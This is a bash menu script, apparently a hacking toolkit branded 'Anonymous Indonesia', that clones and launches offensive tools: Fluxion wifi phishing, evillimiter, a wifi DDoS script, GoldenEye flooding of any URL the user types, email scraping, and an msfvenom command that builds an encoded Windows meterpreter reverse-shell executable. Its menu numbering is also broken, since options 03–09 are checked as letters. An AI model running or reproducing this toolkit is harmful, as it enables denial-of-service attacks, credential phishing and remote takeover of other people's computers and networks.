#!/bin/bash

clear
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "##################################################################################" | lolcat
echo "Author : MrXonee" | lolcat
echo "Github : https://github.com/MrXonee/Tools" | lolcat
echo "##################################################################################" | lolcat
toilet -f term "   /\_/\     (\_/)" | lolcat
toilet -f term " =[ •~• ]=   (•.•)" | lolcat
toilet -f term "    [\]_     <===>" | lolcat
toilet -f term " /\---------/\      J" | lolcat
toilet -f term "| |)  •  ~  • |   R • R" | lolcat
toilet -f term "| |^^^^^^^^^^^| M ••|•• M" | lolcat
toilet -f term "| |^^^^^^^^^^^] M ••|•• M" | lolcat
toilet -f term "| |ΩΩ=======ΩΩ]   R • R" | lolcat
toilet -f term "| |___________|     J" | lolcat
toilet -f term "\_|_________|_/ GUNAKAN DENGAN BIJAK!!!" | lolcat
echo "##################################################################################" | lolcat
echo "[!] USE A USB WIRELESS ADAPTER [!]" | lolcat
echo "##################################################################################" | lolcat
echo "$a[01]─>>INSTALL ALL PACKAGE FOR RUNNING TOOLS" | lolcat
echo "$b[02]─>>CONTROL NETWORK WIFI [EVILLIMITER]" | lolcat
echo "$c[03]─>>PENETRATION TESTING WIFI [FLUXION]" | lolcat
echo "$d[04]─>>VULNERABILITY SCANNING WEBSITE [REDHAWK]" | lolcat
echo "$e[05]─>>DDOS ATTACK WIFI" | lolcat
echo "$f[06]─>>DDOS ATTACK WEBSITE" | lolcat
echo "$g[07]─>>INFORMATION GATHERING AND SCANNING WEBSITE" | lolcat
echo "$h[08]─>>EMAIL SCRAPER WEBSITE" | lolcat
echo "$i[09]─>>CREATE PAYLOAD FOR WINDOWS x64 FORMAT EXE" | lolcat
echo "$j[10]─>>METASPLOIT" | lolcat
echo "$k[11]─>>VPN/PROXY [WHOAMI]" | lolcat
echo "$l[l]─>>WEBKILLER" | lolcat
echo "$m[m]─>>" | lolcat
echo "$n[n]─>>" | lolcat
echo "$o[o]─>>" | lolcat
echo "$p[p]─>>" | lolcat
echo "$q[q]─>>" | lolcat
echo "$r[r]─>>" | lolcat
echo "$s[s]─>>" | lolcat
echo "$t[t]─>>" | lolcat
echo "$u[u]─>>" | lolcat
echo "$v[v]─>>" | lolcat
echo "$w[w]─>>" | lolcat
echo "$x[x]─>>" | lolcat
echo "$y[y]─>>" | lolcat
echo "$z[z]─>>EXIT" | lolcat
echo "##################################################################################" | lolcat
echo "╭─[MrXonee@root]" | lolcat
read -p"╰─>> " pil

if [ $pil = 01 ]
then
echo $i"Openning... "
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]SEMUA PACKAGE AKAN DI INSTALL MOHON TUNGGU SAMPAI SELESAI" | lolcat
echo "##################################################################################" | lolcat
sleep 1
apt update -y
apt upgrade -y
apt install bc -y
apt install mdk3 -y
apt install cowpatty -y
apt install dsniff -y
apt install hostapd -y
apt install xterm -y
apt install php-cgi -y
apt install mdk4 -y
apt install lighttpd -y
apt install isc-dhcp-server -y
apt install toilet -y
apt install figlet -y
apt install lolcat -y
apt install autossh -y
apt install php -y
apt install php-curl -y
apt install php-xml -y
apt install python3 -y
apt install openssl -y
apt install git -y
apt install slowhttptest -y
apt install gnome-terminal -y
apt install etherape -y
apt install tor torbrowser-launcher -y
apt install tar tor curl python3 python3-scapy network-manager -y
echo "##################################################################################" | lolcat
echo "SEMUA PACKAGE BERHASIL DI INSTALL" | lolcat
echo "##################################################################################" | lolcat
sleep 5
bash it.sh
fi

if [ $pil = 02 ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]RUNNING TOOLS EVILLIMITER" | lolcat
echo "##################################################################################" | lolcat
sleep 5
git clone https://github.com/bitbrute/evillimiter
ifconfig eth0 down
cd evillimiter
python3 setup.py install
evillimiter
fi

if [ $pil = c ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]RUNNING TOOLS FLUXION" | lolcat
echo "##################################################################################" | lolcat
sleep 5
git clone https://github.com/FluxionNetwork/fluxion
cd fluxion
bash fluxion.sh
fi

if [ $pil = d ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]RUNNING TOOLS REDHAWK" | lolcat
echo "##################################################################################" | lolcat
sleep 5
git clone https://github.com/Tuhinshubhra/RED_HAWK.git
cd RED_HAWK
php rhawk.php
fi

if [ $pil = e ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]RUNNING TOOLS DDOS ATTACK WIFI" | lolcat
echo "##################################################################################" | lolcat
sleep 5
sudo python3 ddos.py
fi

if [ $pil = f ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]RUNNING TOOLS DDOS ATTACK WEBSITE" | lolcat
echo "##################################################################################" | lolcat
sleep 5
git clone https://github.com/jseidl/GoldenEye
cd GoldenEye
chmod +x goldeneye.py
echo "╭─[Masukan URL Website]" | lolcat
read -p"╰─>> " url
./goldeneye.py $url -w 150 -d
fi

if [ $pil = g ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]RUNNING TOOLS INFORMATION GATHERING AND SCANNING WEBSITE" | lolcat
echo "##################################################################################" | lolcat
sleep 5
python3 checkip.py
echo "##################################################################################" | lolcat
echo "|─[Whois]" | lolcat
echo "╭─[Masukan Nama Domain Website]" | lolcat
read -p"╰─>> " url
whois $url
echo "##################################################################################" | lolcat
echo "|─[Whatweb]" | lolcat
echo "╭─[Masukan Nama Domain Website]" | lolcat
read -p"╰─>> " url
whatweb $url -v
echo "##################################################################################" | lolcat
echo "|─[Nmap]" | lolcat
echo "╭─[Masukan Alamat IP Website]" | lolcat
read -p"╰─>> " ip
nmap $ip
echo "##################################################################################" | lolcat
echo "╭─[Ketik bash it.sh Jika Ingin Kembali]" | lolcat
read -p"╰─>> " back
$back
fi

if [ $pil = h ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]RUNNING TOOLS EMAIL SCRAPER WEBSITE" | lolcat
echo "##################################################################################" | lolcat
sleep 5
python3 emailscraper.py
echo "╭─[Ketik bash it.sh Jika Ingin Kembali]" | lolcat
read -p"╰─>> " back
$back
fi

if [ $pil = i ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]RUNNING TOOLS CREATE PAYLOAD FOR WINDOWS x64" | lolcat
echo "##################################################################################" | lolcat
sleep 5
ifconfig
echo "╭─[Masukan IP Address Komputer/Laptop]" | lolcat
read -p"╰─>> " lhost
echo "╭─[Masukan PORT]" | lolcat
read -p"╰─>> " lport
echo "##################################################################################" | lolcat
echo "[!]MOHON TUNGGU SAMPAI SELESAI" | lolcat
echo "##################################################################################" | lolcat
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a x64 --platform windows -e x64/zutto_dekiru -i 10 -n 500 -f exe -o windowsx64.exe
echo "##################################################################################" | lolcat
echo "[!]SUCCESS CREATE PAYLOAD..." | lolcat
echo "[!]CHECK PAYLOAD AT FOLDER Tools" | lolcat
echo "##################################################################################" | lolcat
echo "╭─[Ketik bash it.sh Jika Ingin Kembali]" | lolcat
read -p"╰─>> " back
$back
fi

if [ $pil = 10 ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]RUNNING TOOLS METASPLOIT" | lolcat
echo "##################################################################################" | lolcat
sleep 1
msfconsole
fi

if [ $pil = 11 ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]RUNNING TOOLS WHOAMI VPN/PROXY" | lolcat
echo "##################################################################################" | lolcat
sleep 5
git clone https://github.com/omer-dogan/kali-whoami
cd kali-whoami
sudo make install
echo "╭─[ketik start]" | lolcat
read -p"╰─>> " vpn
kali-whoami --$vpn
fi

if [ $pil = l ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]RUNNING TOOLS WEBKILLER" | lolcat
echo "##################################################################################" | lolcat
sleep 5
git clone https://github.com/ultrasecurity/webkiller
cd webkiller
pip3 install -r requirments.txt
python3 webkiller.py
fi

if [ $pil = m ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = n ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = o ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = p ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = q ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = r ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = s ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = t ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = u ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = v ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = w ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = x ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = y ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "[!]" | lolcat
echo "##################################################################################" | lolcat
sleep 5
fi

if [ $pil = z ]
then
echo $i"Openning..."
sleep 2
clear
sleep 2
echo "##################################################################################" | lolcat
toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
echo "**********************************************************************************" | lolcat
echo "##################################################################################" | lolcat
echo "[+]TERIMAKASIH SUDAH MEMAKAI TOOLS MrXonee" | lolcat
echo "[+]SEE YOU BYE" | lolcat
echo "##################################################################################" | lolcat
sleep 5
airmon-ng stop wlan0mon
service NetworkManager restart
exit
fi
